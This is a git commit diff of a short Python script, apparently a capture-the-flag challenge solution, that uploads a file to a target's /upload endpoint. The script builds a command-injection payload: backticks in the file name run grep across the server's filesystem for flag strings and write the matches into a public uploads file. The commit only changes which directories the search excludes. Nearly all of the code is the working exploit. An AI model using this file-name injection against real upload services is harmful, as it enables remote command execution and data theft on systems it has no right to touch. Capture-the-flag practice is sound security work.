b5a030799aaa8da956ab643d8d9b02980d25235e
Arvid Persson <58560927+arvid-persson1@users.noreply.github.com>
2025-10-26 15:26:43 +0100

    fixed /srv being treated as system directory

--- chal5/main.py
+++ chal5/main.py
@@ -4,7 +4,7 @@ from requests import post
 url_index, img_path = argv[1:3]
 url_upload = f"{url_index}/upload"
 
-sys_dirs = ("bin", "dev", "lib64", "opt", "root", "sbin", "sys", "usr", "boot", "etc", "lib", "mnt", "proc", "run", "srv", "tmp", "var")
+sys_dirs = ("bin", "dev", "lib64", "opt", "root", "sbin", "sys", "usr", "boot", "etc", "lib", "mnt", "proc", "run", "tmp", "var")
 exclude = "".join(f"--exclude-dir={dir}" for dir in sys_dirs)
 injection = fr"""`grep -rsiPo "flag{{\K.*?(?=}})" / {exclude} > uploads/flag.txt`.png"""
 
